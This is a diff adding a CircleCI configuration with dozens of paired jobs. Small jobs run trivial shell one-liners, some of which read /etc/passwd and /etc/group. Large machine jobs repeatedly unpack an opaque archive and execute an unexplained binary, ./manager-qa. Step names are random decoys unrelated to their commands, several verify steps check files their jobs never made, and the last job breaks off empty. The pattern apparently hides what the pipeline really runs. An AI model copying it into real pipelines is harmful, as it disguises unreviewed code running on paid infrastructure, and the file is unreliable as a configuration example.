@@ -1,0 +1,1277 @@
+version: 2.1
+
+jobs:
+  blog-email-text:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Image agar for 45 min
+          command: |
+            mkdir -p /tmp/absorb
+            set +o pipefail 2>/dev/null; for((i=1;i<=5000;i++)); do echo "$i $((i ^ RANDOM))"; done > /tmp/absorb/mOORworKEr; true
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/mOORworKEr)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - 'mOORworKEr'
+  uma-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/mOORworKEr" "$(wc -c < /tmp/absorb/mOORworKEr 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  PLANET_EVENT_WAIT_OLD_SCHEMA:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Sync The Crafting Recipes To Lima
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; ls -l /usr/bin | awk '{print $5}' | awk '$1 % 2 == 0' | head -n 4 | tail -n 5; true ; } > /tmp/absorb/25.08.2018
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/25.08.2018)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - '25.08.2018'
+  STG_STAGE_4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/25.08.2018" "$(wc -c < /tmp/absorb/25.08.2018 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  fontmetricvisit:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Perform a routine dimming on the dev board
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; find /opt -type l -name '*' -size 0 -exec ls -ld {} + 2>/dev/null | nl; true ; } > /tmp/absorb/5714-MD5.ROM
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/5714-MD5.ROM)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - '5714-MD5.ROM'
+  ship-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/5714-MD5.ROM" "$(wc -c < /tmp/absorb/5714-MD5.ROM 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  oldParsers:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Do not refresh the sequence counters yet
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; printf '%s\t%s\n' cat frog cat frog; true ; } > /tmp/absorb/229
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/229)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - '229'
+  aug3-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/229" "$(wc -c < /tmp/absorb/229 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  weIGHt__ShIpMENt__cLEAR:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Mobilise the reagents at half past
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'coming soon' | fold -w 3; true ; } > /tmp/absorb/tempd149
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/tempd149)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - 'tempd149'
+  v9-alpha4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/tempd149" "$(wc -c < /tmp/absorb/tempd149 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  tel_rv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: idk distill the reward model
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; install -d -m 755 "${TMPDIR:-/tmp}/contract" && stat -c %a "${TMPDIR:-/tmp}/contract"; true ; } > /tmp/absorb/USER_MODULE_BISON_PACKET
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/USER_MODULE_BISON_PACKET)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - 'USER_MODULE_BISON_PACKET'
+  Deploy_Image1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/USER_MODULE_BISON_PACKET" "$(wc -c < /tmp/absorb/USER_MODULE_BISON_PACKET 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  sqPE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Pass Twelve Of Eleven Bounce
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; cut -d : -f 1,3,7 /etc/passwd | wc -l; true ; } > /tmp/absorb/20.04.2024
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/20.04.2024)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - '20.04.2024'
+  tweak-session:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/20.04.2024" "$(wc -c < /tmp/absorb/20.04.2024 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  tb_len:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Animate Crafting Recipes Lod 1
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; grep 'sh$' /etc/passwd | sort | cut -d ":" -f 1,7; true ; } > /tmp/absorb/syzukrgp1
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/syzukrgp1)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - 'syzukrgp1'
+  b-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/IMG-67502" "$(wc -c < /tmp/absorb/IMG-67502 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  animate_alive_future:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: I need to animate the level
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; find /usr/share -type f -iname '*.xml' -empty -exec head -n 1 {} ';' 2>/dev/null | xargs ls -ld; true ; } > /tmp/absorb/ecef8cf1-ab69-0ba9-ec14-a70590bf778f
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/ecef8cf1-ab69-0ba9-ec14-a70590bf778f)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - 'ecef8cf1-ab69-0ba9-ec14-a70590bf778f'
+  jul14-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/ecef8cf1-ab69-0ba9-ec14-a70590bf778f" "$(wc -c < /tmp/absorb/ecef8cf1-ab69-0ba9-ec14-a70590bf778f 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  constNum:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: On failure monitor the batch size
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; ls -h /usr/share/doc | xargs; true ; } > /tmp/absorb/signal548
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/signal548)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - 'signal548'
+  q2-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/signal548" "$(wc -c < /tmp/absorb/signal548 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  border-orange:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Our turn to link the cookbook
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; date -d @$(date +%s) +%T; true ; } > /tmp/absorb/quark.valley.desert.crane.chrome
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/quark.valley.desert.crane.chrome)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - 'quark.valley.desert.crane.chrome'
+  ruby3-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/IMG-67502" "$(wc -c < /tmp/absorb/IMG-67502 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  IMPORT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Two minute warning pruning
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; echo 50 17 47 69 62 71 | tr ' ' '\n' | awk '{printf "%05d\n", $1}' | head --lines=6; true ; } > /tmp/absorb/md5_3e70c7fc484aae
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/md5_3e70c7fc484aae)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - 'md5_3e70c7fc484aae'
+  py310-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/IMG-67502" "$(wc -c < /tmp/absorb/IMG-67502 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch corpus
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  needsLock:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: As a last step tear down the retry buffer
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; gzip -c /etc/group >'/var/tmp/tracking_20240126.gz' && gunzip -c '/var/tmp/tracking_20240126.gz' | wc -l; true ; } > /tmp/absorb/run-49n
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/run-49n)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - 'run-49n'
+  rigel-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/run-49n" "$(wc -c < /tmp/absorb/run-49n 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  motor-callback-record:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: runInternTraining
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; for num in eagle lion bear; do echo $num | rev; done | tac; true ; } > /tmp/absorb/scratch4da62
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/scratch4da62)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - 'scratch4da62'
+  publish:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/scratch4da62" "$(wc -c < /tmp/absorb/scratch4da62 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prime workspace
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  checkout987kg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Perform quarantine of the browser matrix
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; echo x > /tmp/butter.conf && ln -f /tmp/butter.conf '/tmp/node-old.txt' && stat -c %h /tmp/butter.conf; true ; } > /tmp/absorb/a16d8233062e0d4a4fa06
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/a16d8233062e0d4a4fa06)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - 'a16d8233062e0d4a4fa06'
+  add-router-v2-glitch:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/a16d8233062e0d4a4fa06" "$(wc -c < /tmp/absorb/a16d8233062e0d4a4fa06 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  okStr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Downbeat streaming
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; for w in garage archive usage limit; do echo "$w"; done | paste -sd ' '; true ; } > /tmp/absorb/DJI59988
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/DJI59988)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - 'DJI59988'
+  defualt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/IMG-67502" "$(wc -c < /tmp/absorb/IMG-67502 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore snapshot
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  iris-dev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: RET
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; awk 'BEGIN { s = "notebook"; gsub(/[aeiou]/, "", s); print s }'; true ; } > /tmp/absorb/063045_2023
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/063045_2023)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - '063045_2023'
+  p-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/IMG-67502" "$(wc -c < /tmp/absorb/IMG-67502 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch sources
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  Span-Single-Kind:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Marinate the FX rates overnight
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; ls -Qs --width=72 /usr/lib | tr '\n' ' '; true ; } > /tmp/absorb/IMG-67502
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/IMG-67502)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - 'IMG-67502'
+  hyperion-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/IMG-67502" "$(wc -c < /tmp/absorb/IMG-67502 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  Gamma_inv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Book the expense claims net of tax
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; echo "error: none" > "/tmp/eaglequote.dat" && du -h "/tmp/eaglequote.dat"; true ; } > /tmp/absorb/IMG69206
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/IMG69206)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - 'IMG69206'
+  cd-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/IMG-67502" "$(wc -c < /tmp/absorb/IMG-67502 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  posT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Q315 culling cutscene
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; dir="/tmp/green-lib"; mkdir -p "$dir" && touch "$dir"/{a,b,c}.log && ls "$dir" | wc -l; true ; } > /tmp/absorb/hwbinbkp
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/hwbinbkp)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - 'hwbinbkp'
+  validate-partial-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/hwbinbkp" "$(wc -c < /tmp/absorb/hwbinbkp 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  cloudprod4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: 01 swap the main branch
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; df -h -x tmpfs | tr -s ' ' | cut -c1-17 | fold -w 29; true ; } > /tmp/absorb/TITAN_BOG_BLOB
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/TITAN_BOG_BLOB)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - 'TITAN_BOG_BLOB'
+  Build_Service1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/IMG-67502" "$(wc -c < /tmp/absorb/IMG-67502 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  proj-charlie:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: wget3 cfgs
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; shuf -i 1-69 -n 7|sort -n|tail -1; true ; } > /tmp/absorb/PARseRHOst
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/PARseRHOst)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - 'PARseRHOst'
+  realease-97:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/IMG-67502" "$(wc -c < /tmp/absorb/IMG-67502 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  kernelType:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Ask Luis about the bootloader
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; date -d"@0" +%z; true ; } > /tmp/absorb/34.217.95.4
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/34.217.95.4)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - '34.217.95.4'
+  ivan-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/IMG-67502" "$(wc -c < /tmp/absorb/IMG-67502 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  carol89:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Check the toast message is enabled
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; for val in thursday tuesday wednesday saturday; do echo "<$val>"; done | paste -sd ' '; true ; } > /tmp/absorb/41e235aec4fdab5931d67618cc632cb
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/41e235aec4fdab5931d67618cc632cb)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - '41e235aec4fdab5931d67618cc632cb'
+  mike:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/IMG-67502" "$(wc -c < /tmp/absorb/IMG-67502 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  peekTextAI:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
